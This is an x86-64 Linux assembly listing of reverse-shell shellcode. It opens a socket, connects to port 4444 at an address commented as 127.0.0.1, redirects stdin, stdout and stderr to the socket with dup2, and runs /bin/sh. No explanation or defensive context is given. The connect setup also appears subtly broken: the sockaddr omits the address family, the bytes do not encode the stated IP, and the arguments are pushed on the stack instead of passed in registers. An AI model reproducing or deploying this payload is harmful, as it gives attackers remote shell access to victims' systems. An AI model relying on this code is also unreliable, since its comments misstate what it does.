section .text
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor rax, rax
    mov al, 41          ; syscall: socket
    xor rdi, rdi
    mov dil, 2          ; AF_INET
    xor rsi, rsi
    mov sil, 1          ; SOCK_STREAM
    xor rdx, rdx        ; Protocol 0
    syscall

    ; connect(sock, (struct sockaddr *)&server, sizeof(server))
    xchg rdi, rax       ; Move socket to rdi
    xor rax, rax
    push rax
    push word 0x5c11    ; Port number 4444
    push word 0x7f01    ; IP address 127.0.0.1
    mov rsi, rsp
    push 16             ; sizeof(struct sockaddr_in)
    push rsi
    push rdi
    mov rdx, rsp
    mov al, 42          ; syscall: connect
    syscall

    ; dup2(sock, 0)
    xor rax, rax
    mov al, 33          ; syscall: dup2
    xor rsi, rsi
    syscall

    ; dup2(sock, 1)
    xor rax, rax
    mov al, 33
    mov sil, 1
    syscall

    ; dup2(sock, 2)
    xor rax, rax
    mov al, 33
    mov sil, 2
    syscall

    ; execve("/bin/sh", NULL, NULL)
    xor rax, rax
    mov rdi, 0x68732f6e69622f2f
    shr rdi, 0x8
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59          ; syscall: execve
    syscall
